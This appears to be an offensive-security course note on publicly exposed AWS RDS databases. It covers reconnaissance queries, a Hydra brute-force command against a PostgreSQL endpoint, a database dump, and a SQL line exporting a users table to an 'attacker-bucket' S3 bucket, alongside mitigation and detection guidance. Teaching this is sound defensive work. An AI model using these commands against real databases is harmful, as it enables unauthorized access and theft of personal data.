---
tags: [aws, rds, cloud, database, pentesting]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.08 AWS RDS"
---

# AWS RDS — Publicly Exposed Databases

## 1. Introduction to Amazon RDS
Amazon Relational Database Service (Amazon RDS) is a managed database service that provides scalable database servers in the cloud. It supports various database engines such as MySQL, PostgreSQL, MariaDB, Oracle, and Microsoft SQL Server. While Amazon RDS simplifies the setup, operation, and scaling of a relational database, the shared responsibility model dictates that customers are responsible for securing the data and configuring the network access correctly.

A critical misconfiguration often found in cloud environments is the public exposure of these RDS instances. When an RDS instance is publicly exposed, it means that the database endpoint is reachable from the public internet, bypassing the traditional perimeter defenses of a Virtual Private Cloud (VPC). This creates a direct attack vector to the organization's most critical assets: its data.

## 2. Core Architecture and Network Constraints
In a properly configured AWS environment, RDS instances are placed within private subnets of a VPC. A private subnet is one that does not have a route to an Internet Gateway (IGW). Access to these databases is typically mediated by application servers or bastion hosts residing in public subnets, which handle external requests and securely query the private databases.

However, AWS allows customers to make an RDS instance "Publicly Accessible." When this flag is set to `Yes`, AWS assigns a public IP address to the underlying EC2 instance hosting the RDS database. 

For the database to be truly exposed, three conditions must generally be met:
1. **Publicly Accessible Flag**: The RDS instance is launched with `PubliclyAccessible=true`.
2. **Public Subnet**: The RDS instance's subnet group must contain subnets that have a route table directing internet-bound traffic to an Internet Gateway (IGW).
3. **Security Group Misconfiguration**: The Security Group attached to the RDS instance must have inbound rules (Ingress) that allow traffic on the database port (e.g., 3306 for MySQL, 5432 for PostgreSQL) from `0.0.0.0/0` or other excessively broad IP ranges.

## 3. Vulnerability Mechanics
The vulnerability arises not from a software flaw in the database engine itself, but from the network-level misconfiguration. When a database is exposed to the internet, it becomes vulnerable to:
- **Brute-Force and Credential Stuffing**: Attackers can continuously attempt to guess the master user credentials or application user credentials.
- **Exploitation of Unpatched Vulnerabilities**: If the RDS instance is running an older engine version with known CVEs (e.g., PostgreSQL remote code execution), attackers can directly send exploit payloads.
- **Zero-Day Exploits**: Direct exposure increases the risk if a new vulnerability is discovered in the database protocol or engine.
- **Denial of Service (DoS)**: Attackers can flood the database port with connection requests, exhausting connection limits and locking out legitimate application traffic.

### 3.1 The "Publicly Accessible" Setting
When an administrator creates an RDS instance via the AWS Management Console or CLI, the `PubliclyAccessible` parameter defaults to `False` in many contexts, but can easily be flipped to `True` for convenience (e.g., "I just need to connect to it from my laptop to run a quick query"). This temporary convenience often becomes a permanent fixture.

## 4. Attack Flow and Visual Architecture

```text
+-----------------------------------------------------------------------------------+
|                                 The Internet                                      |
|                                                                                   |
|    +-------------------+                             +-----------------------+    |
|    | Attacker Machine  |                             | Shodan / Censys       |    |
|    | (Nmap, Hydra,     +<---- (Reconnaissance) ----->+ (Scans 0.0.0.0/0 for  |    |
|    |  Metasploit)      |                             |  open ports 3306,     |    |
|    +---------+---------+                             |  5432, 1433)          |    |
|              |                                       +-----------------------+    |
+--------------|--------------------------------------------------------------------+
               |
               | (Direct Connection via Public IP / Endpoint)
               v
+-----------------------------------------------------------------------------------+
|  AWS Cloud Context                                                                |
|                                                                                   |
|  +-----------------------------------------------------------------------------+  |
|  | VPC (Virtual Private Cloud)                                                 |  |
|  |                                                                             |  |
|  |   +-----------------------+                                                 |  |
|  |   | Internet Gateway (IGW)|                                                 |  |
|  |   +-----------+-----------+                                                 |  |
|  |               |                                                             |  |
|  |   +-----------v---------------------------------------------------------+   |  |
|  |   | Public Subnet                                                       |   |  |
|  |   |                                                                     |   |  |
|  |   |  +---------------------------------------------------------------+  |   |  |
|  |   |  | Security Group (Overly Permissive)                            |  |   |  |
|  |   |  | Inbound: Port 5432 from 0.0.0.0/0                             |  |   |  |
|  |   |  |                                                               |  |   |  |
|  |   |  |   +-------------------------------------------------------+   |  |   |  |
|  |   |  |   | Amazon RDS Instance (PostgreSQL)                      |   |  |   |  |
|  |   |  |   | Endpoint: mydb.cxxxxxxx.us-east-1.rds.amazonaws.com   |   |  |   |  |
|  |   |  |   | PubliclyAccessible: TRUE                              |   |  |   |  |
|  |   |  |   +-------------------------------------------------------+   |  |   |  |
|  |   |  +---------------------------------------------------------------+  |   |  |
|  |   +---------------------------------------------------------------------+   |  |
|  +-----------------------------------------------------------------------------+  |
+-----------------------------------------------------------------------------------+
```

## 5. Discovery and Reconnaissance

### 5.1 External Reconnaissance
Attackers do not need AWS credentials to find these databases. They can rely on massive internet-wide scanning engines.
- **Shodan / Censys**: Searching for RDS endpoints or specific SSL certificates associated with AWS RDS.
  - Shodan query: `hostname:.rds.amazonaws.com port:5432`
  - Censys query: `services.tls.certificates.leaf_data.subject.CN: "*.rds.amazonaws.com"`

### 5.2 Internal Reconnaissance (Assume Breach / Compromised AWS Credentials)
If an attacker compromises AWS IAM credentials (e.g., via SSRF on an EC2 instance, or leaked access keys), they can enumerate RDS instances to check for public exposure.

Using the AWS CLI:
```bash
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,Endpoint.Address,PubliclyAccessible]' \
  --output table
```

This command directly reveals which databases have the `PubliclyAccessible` flag set to `True`.

Next, the attacker must check the attached Security Groups:
```bash
aws ec2 describe-security-groups \
  --group-ids <security-group-id-from-rds-output>
```
If the output contains an `IpRanges` block with `CidrIp: 0.0.0.0/0` on the database port, the database is exposed to the world.

### 5.3 Automated Auditing Tools
- **ScoutSuite**: Will flag RDS instances with `PubliclyAccessible` enabled and permissive security groups.
- **Pacu**: The AWS exploitation framework has modules like `rds__enum` which can enumerate databases and snapshot them.

## 6. Exploitation Phase

### 6.1 Brute-Forcing Credentials
Once an exposed RDS instance is found, the attacker will attempt to guess the credentials. AWS RDS requires a "master user" upon creation (default often `admin`, `postgres`, `root`, or `sa`).

Using Hydra to brute-force a PostgreSQL RDS instance:
```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
  pgsql://mydb.cxxxxxxx.us-east-1.rds.amazonaws.com:5432
```

### 6.2 Exploiting Default/Weak Passwords
Developers often use weak passwords for development or staging databases, assuming that the obscurity of the RDS endpoint name will protect them. If a password like `admin123` or `password` is used, the database is compromised in seconds.

### 6.3 Post-Authentication Data Exfiltration
Upon successful authentication, the attacker can connect using native database clients:
```bash
psql -h mydb.cxxxxxxx.us-east-1.rds.amazonaws.com -U postgres -d mydatabase
```
From here, the attacker dumps the entire database, which may contain Personally Identifiable Information (PII), bcrypt password hashes, or sensitive API keys used by the application.

### 6.4 Lateral Movement and Code Execution
If the database engine supports it, attackers may attempt to execute OS commands or read local files. However, AWS RDS is a managed service, so underlying OS access is heavily restricted. 
- In PostgreSQL, functions like `COPY ... TO PROGRAM` or `pg_read_file` are restricted for the RDS `rds_superuser` role.
- In SQL Server (RDS), `xp_cmdshell` is disabled and cannot be enabled by the customer.
- Therefore, the primary impact is **Data Exfiltration** and **Data Destruction** (Ransomware), rather than pivoting to the underlying host.

However, attackers might find AWS IAM credentials stored *inside* the database tables (e.g., an application storing IAM user keys for third-party integrations), which allows them to pivot back into the AWS environment.

## 7. Snapshots and Unencrypted Backups
Another variation of RDS exposure involves **Public RDS Snapshots**.
If an administrator creates a manual snapshot of an RDS instance and changes the snapshot permissions to "Public" (often by mistake when trying to share it with another AWS account), anyone in the world can restore that snapshot into their own AWS account and access the data.

To enumerate public snapshots using AWS CLI:
```bash
aws rds describe-db-snapshots \
  --include-public \
  --snapshot-type public
```
*Note: This command will return thousands of public snapshots from other users. Attackers filter this for specific organization names.*

## 8. Mitigation and Remediation

### 8.1 Architectural Fixes
1. **Private Subnets Only**: Ensure RDS instances are launched in private subnets with no route to an IGW.
2. **Disable PubliclyAccessible**: Set `PubliclyAccessible` to `False` for all RDS instances. This immediately removes the public IP, regardless of security group rules.
3. **Strict Security Groups**: Configure Security Groups to only allow inbound traffic from specific application tier Security Groups, NOT IP ranges.
   - *Example*: Inbound Rule -> PostgreSQL (5432) -> Source: `sg-0abcd1234 (App Server SG)`

### 8.2 Secure Access Mechanisms
If administrators need direct access to the database for debugging or maintenance:
- **AWS Systems Manager (SSM) Session Manager**: Deploy a bastion host in a private subnet and access it via SSM (no open inbound ports required). Connect to the RDS instance from the bastion.
- **Client VPN / Site-to-Site VPN**: Require administrators to connect to the AWS VPC via VPN before accessing the database.
- **RDS Proxy**: Use RDS Proxy for connection pooling and better access control.

### 8.3 IAM Database Authentication
Instead of relying on static database passwords, enable **IAM Database Authentication**. This allows users and applications to authenticate to RDS (MySQL and PostgreSQL) using IAM credentials and temporary authentication tokens.
- Tokens are valid for only 15 minutes.
- Prevents password brute-forcing.

## 9. Detection and Monitoring

### 9.1 AWS Config Rules
Deploy AWS Config rules to continuously monitor for exposed RDS instances:
- `rds-instance-public-access-check`: Checks whether the RDS instance is publicly accessible.
- `vpc-sg-open-only-to-authorized-ports`: Checks if security groups allow unrestricted incoming traffic.

### 9.2 GuardDuty
AWS GuardDuty will detect and alert on anomalous access patterns, such as an unusual volume of database connections originating from known malicious IP addresses or Tor exit nodes.

### 9.3 CloudTrail Logs
Monitor CloudTrail for the `CreateDBInstance` or `ModifyDBInstance` API calls where the `PubliclyAccessible` parameter is true.
```json
{
  "eventName": "ModifyDBInstance",
  "requestParameters": {
    "publiclyAccessible": true,
    "dBInstanceIdentifier": "production-db"
  }
}
```

## 10. Chaining Opportunities
- **[[12 - AWS IAM Privilege Escalation]]**: If an attacker finds static IAM keys within the RDS tables, they can use them to escalate privileges within the AWS account.
- **[[02 - SSRF in Cloud Environments]]**: If the RDS instance is perfectly secured in a private subnet, an attacker might compromise a web application running on an EC2 instance in a public subnet via SSRF, and use the EC2 instance as a pivot to query the internal RDS database.
- **[[11 - AWS Cognito — Misconfigured User Pools]]**: A compromised Cognito pool might grant an attacker temporary credentials that, if overly permissive, allow them to modify RDS security groups.

## 11. Related Notes
- [[07 - Network Security Groups and NACLs]]
- [[03 - Secrets Management in Cloud]]
- [[04 - Cloud Reconnaissance Techniques]]

## 12. Advanced Exploitation: Extracting Cloud Credentials via Database Features
While direct OS command execution is often blocked, some database engines offer extensions that can be abused. For instance, in PostgreSQL, if the `aws_s3` extension is installed and configured with a role, an attacker with `rds_superuser` access might attempt to extract data to an external S3 bucket they control, or read arbitrary S3 buckets if the RDS instance's IAM role has overly broad permissions.

```sql
-- Example of exfiltrating data to an external S3 bucket
SELECT * FROM aws_s3.query_export_to_s3(
    'SELECT * FROM users',
    aws_commons.create_s3_uri('attacker-bucket', 'dump.csv', 'us-east-1'),
    options :='format csv'
);
```

## 13. Regulatory and Compliance Impact
Exposing an RDS instance publicly often violates multiple compliance frameworks immediately:
- **PCI-DSS**: Requires databases containing cardholder data to be strictly segregated and not directly accessible from the internet.
- **HIPAA**: Requires strict access controls and encryption.
- **SOC 2**: Security and Confidentiality principles are violated by bypassing network perimeter controls.

## 14. Automation Scripts for Detection
Security teams can use simple Python scripts utilizing `boto3` to continuously monitor for this misconfiguration across all regions:

```python
import boto3

def check_public_rds():
    client = boto3.client('rds')
    paginator = client.get_paginator('describe_db_instances')
    for page in paginator.paginate():
        for db in page['DBInstances']:
            if db.get('PubliclyAccessible', False):
                print(f"[!] Alert: RDS Instance {db['DBInstanceIdentifier']} is Publicly Accessible!")
                # Next step would be to verify Security Group rules attached to it

if __name__ == '__main__':
    check_public_rds()
```
